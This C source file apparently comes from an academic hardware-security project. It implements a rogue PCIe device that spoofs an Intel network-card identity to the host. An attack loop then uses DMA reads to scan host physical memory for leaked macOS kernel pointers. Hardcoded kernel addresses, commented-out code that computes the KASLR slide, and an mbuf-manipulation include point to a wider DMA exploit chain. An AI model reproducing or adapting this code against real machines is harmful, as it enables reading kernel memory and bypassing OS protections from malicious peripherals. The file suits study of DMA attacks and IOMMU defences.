/*-
 * SPDX-License-Identifier: BSD-2-Clause
 * 
 * Copyright (c) 2015-2018 Colin Rothwell
 * 
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory under DARPA/AFRL contract FA8750-10-C-0237
 * ("CTSRD"), as part of the DARPA CRASH research programme.
 * 
 * We acknowledge the support of EPSRC.
 * 
 * We acknowledge the support of Arm Ltd.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <inttypes.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "mask.h"
#include "macos-mbuf-manipulation.h"
#include "crhexdump.h"
#include "pcie.h"
#include "pcie-backend.h"
#include "qemu/bswap.h"


static inline uint64_t
get_page_address(uint64_t address)
{
	return (address & ~uint64_mask(12));
}

int
read_page(uint64_t address, uint32_t devfn, uint8_t* buffer)
{
	const int CHUNK_SIZE = 256;
	int i, read_result = 0;
	uint64_t page_address = get_page_address(address);
	for (i = 0; i < 4096; i += CHUNK_SIZE) {
		read_result = perform_dma_read((buffer + i), CHUNK_SIZE, devfn, 0,
			(page_address + i));
		if (read_result != 0) {
			break;
		}
	}
	return read_result;
}

int
print_page_at_address(uint64_t address, uint32_t devfn)
{
	int read_result;
	uint8_t page_data[4096];

	read_result = read_page(address, devfn, page_data);

	if (read_result == -1) {
		printf("UR trying read page.\n");
		return read_result;
	}

	printf("0x%"PRIx64"\n", get_page_address(address));
	crhexdump(page_data, 4096);

	return read_result;
}

enum attack_state {
	AS_UNINITIALISED,
	AS_LOOKING_FOR_LEAKED_SYMBOL
};

enum packet_response {
	PR_NO_RESPONSE, PR_RESPONSE
};

struct packet_response_state {
	uint32_t devfn;
	enum attack_state attack_state;
};

enum packet_response
respond_to_packet(struct packet_response_state *state,
	struct RawTLP *in, struct RawTLP *out)
{
	uint16_t requester_id;
	uint16_t device_id;
	uint64_t req_addr;
	enum packet_response response = PR_NO_RESPONSE;
	struct TLP64DWord0 *dword0 = (struct TLP64DWord0 *)in->header;
	struct TLP64RequestDWord1 *request_dword1 =
		(struct TLP64RequestDWord1 *)(in->header + 1);
	struct TLP64ConfigRequestDWord2 *config_request_dword2 =
		(struct TLP64ConfigRequestDWord2 *)(in->header + 2);

	enum tlp_direction dir = get_tlp_direction(in);

	requester_id = tlp_get_requester_id(request_dword1);

	printf("header addr: %p\n", in->header);
	printf("dword0: 0x%08"PRIx32" (%d).\n", *(uint32_t *)dword0, sizeof(dword0));
	printf("dword1: 0x%08"PRIx32" (%d).\n",
		*(uint32_t *)request_dword1, sizeof(request_dword1));
	printf("dword2: 0x%08"PRIx32" (%d).\n",
		*(uint32_t *)config_request_dword2, sizeof(config_request_dword2));

	switch (tlp_get_type(dword0)) {
	case CFG_0:
		printf("cfg0 reg_num=%#x, ext_reg_num=%#x, device_idL=%#x, device_idH=%#x\n", \
			config_request_dword2->reg_num,
			config_request_dword2->ext_reg_num,
			config_request_dword2->device_idL,
			config_request_dword2->device_idH);
		device_id = tlp_get_device_id(config_request_dword2);
		if ((device_id & uint32_mask(3)) != 0) {
			printf("ENDIAND ISSUES AHEAD! Don't like device_id: %x.\n",
				device_id);
		}

		state->devfn = device_id;

		response = PR_RESPONSE;
		req_addr = get_config_req_addr(in);
		printf("cfg0, device_id=%#08x\n, addr = %#08x, dir=%#x", device_id, req_addr, dir);

		if (dir == TLPD_READ) {
			out->data_length = 4;
			switch (req_addr) {
			case 0: /* vendor and device id */
				out->data[0] = 0x104b8086;
				if (state->attack_state == AS_UNINITIALISED) {
					state->attack_state = AS_LOOKING_FOR_LEAKED_SYMBOL;
				}
				break;
			default:
				out->data[0] = 0;
			}
			printf("cfg0 read addr=%#016llx, returning data=%#08x\n", req_addr, out->data[0]);
			out->data[0] = le32_to_cpu(out->data[0]);
		} else {
			out->data_length = 0;
		}

		out->header_length = 12;
		create_completion_header(out, dir, state->devfn,
			TLPCS_SUCCESSFUL_COMPLETION, 4, requester_id, request_dword1->tag,
			0);

		break;
	case CPL:
		printf("Got CPL ");
		if (in->data_length > 0) {
			printf("with data[0] 0x%x.\n", in->data[0]);
		} else {
			printf("without data.\n");
		}
		break;
	default:
		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(tlp_get_type(dword0)),
			tlp_get_type(dword0));
		/*puts("Ignoring a TLP :(");*/
		break;
	}
	return response;
}

#define MBUFS_PER_PAGE	(4096 / sizeof(struct mbuf))

FILE *out_file;

void cleanup() {
	fprintf(stderr, "Doing cleanup.\n");
	if (out_file != NULL) {
		fclose(out_file);
	}
}

void signal_cleanup(int sig) {
	exit(1);
}

uint64_t INIT  = 0xffffff8000a15710;
uint64_t PANIC = 0xffffff8000337820;

int
main(int argc, char *argv[])
{
	int i, send_result, read_result;
	TLPQuadWord tlp_out_header[2];
	TLPQuadWord tlp_out_data[16];
	struct RawTLP raw_tlp_in;
	struct RawTLP raw_tlp_out;
	raw_tlp_out.header = (TLPDoubleWord *)tlp_out_header;
	raw_tlp_out.data = (TLPDoubleWord *)tlp_out_data;

	enum packet_response response;
	struct packet_response_state packet_response_state;
	packet_response_state.attack_state = AS_UNINITIALISED;
	uint64_t read_addr;/* next_read_addr = 0x000000; */
	/*uint64_t next_read_addr = 0x3b0000000;*/
	/*uint64_t0xC0040000LL next_read_addr = 0x000000;*/
	uint64_t scan_region_base =  0x2000000;
	uint64_t scan_region_limit = 0x3000000;
	uint64_t next_read_addr = scan_region_base;

	uint64_t candidate_symbols[32];

	out_file = NULL;
	atexit(cleanup);
	signal(SIGINT, signal_cleanup);

	/*if (argc != 2) {*/
		/*fprintf(stderr, "Usage: %s <output_file>.\n", argv[0]);*/
		/*return 1;*/
	/*}*/

	/*out_file = fopen(argv[1], "w");*/
	/*printf("out_file pointer: %#p.\n", out_file);*/
	/*if (ferror(out_file)) {*/
		/*perror("Error opening dump file");*/
		/*return 2;*/
	/*}*/

	int init = pcie_hardware_init(argc, argv, &physmem);
	if (init) {
		puts("Problem initialising PCIE core.");
		return init;
	}

	/*
	 * XXX TODO this is setting stdout unbuffered
	 */
	setvbuf(stdout, NULL, _IONBF, 0);

	drain_pcie_core();
	puts("PCIe Core Drained. Let's go OK.");

	while (1) {
		next_tlp(&raw_tlp_in);

		if (is_raw_tlp_valid(&raw_tlp_in)) {
			printf("header addr: %p, (%08x)\n",
				raw_tlp_in.header, *raw_tlp_in.header);
			response = respond_to_packet(&packet_response_state,
				&raw_tlp_in, &raw_tlp_out);
			if (response != PR_NO_RESPONSE) {
				send_result = send_tlp(&raw_tlp_out);
				assert(send_result != -1);
			}
			free_raw_tlp_buffer(&raw_tlp_in);
			continue;
		}
		free_raw_tlp_buffer(&raw_tlp_in);

		switch (packet_response_state.attack_state) {
		case AS_UNINITIALISED:
			break;
		case AS_LOOKING_FOR_LEAKED_SYMBOL:
		   /*if (next_read_addr > 0x500000) {*/
			if (next_read_addr > scan_region_limit) {
				next_read_addr = scan_region_base;
				/*fprintf(out_file, "reset\n");*/
			}
			if ((next_read_addr & 0xFFFFFF) == 0) {
				printf("0x%"PRIx64".\n", next_read_addr);
				fflush(NULL);
			}
			read_result = perform_dma_read((uint8_t *)candidate_symbols,
				256, packet_response_state.devfn, 0, next_read_addr);
			read_addr = next_read_addr;
			if (read_result == DRR_SUCCESS) {
				next_read_addr += 256;
			} else {
				next_read_addr += 4096;
				continue;
			}
			for (i = 0; i < 32; ++i) {
				candidate_symbols[i] = bswap64(candidate_symbols[i]);
				/*if ((candidate_symbols[i] & 0xfffff) == 0x283c0) {*/
				/*printf("\nFound slid gIOBMDAllocator.\n");*/
				/*printf("At address 0x%lx.\n", read_addr);*/
				/*printf("Slid address: 0x%lx.\n", candidate_symbols[i]);*/
				/*printf("Slide: 0x%lx.\n", candidate_symbols[i] -*/
				/*0xffffff8000b283c0l);*/
				/*}*/
				/*if ((candidate_symbols[i] & 0xFFFFFFF000000000) ==*/
											/*0xFFFFFF8000000000) {*/
					/*read_symbol = true;*/
					/*fprintf(out_file, "%#16lx: %#16lx\n",*/
						/*read_addr + i * sizeof(uint64_t),*/
						/*candidate_symbols[i]);*/
				/*}*/
			}
			break;
		}
	}

	puts("Quitting main loop.");
}
